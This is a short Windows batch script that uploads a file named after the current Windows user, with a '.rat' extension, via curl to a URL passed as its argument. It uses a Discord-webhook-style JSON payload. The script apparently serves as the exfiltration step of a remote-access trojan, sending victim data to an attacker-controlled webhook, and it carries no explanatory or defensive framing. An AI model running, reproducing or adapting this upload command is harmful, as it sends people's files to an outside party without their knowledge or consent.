@echo off
set arg1=%1
shift

curl -F "payload_json={\"username\": \"Config\", \"content\": \"download\"}" -F "file=@%USERNAME%.rat" %arg1%
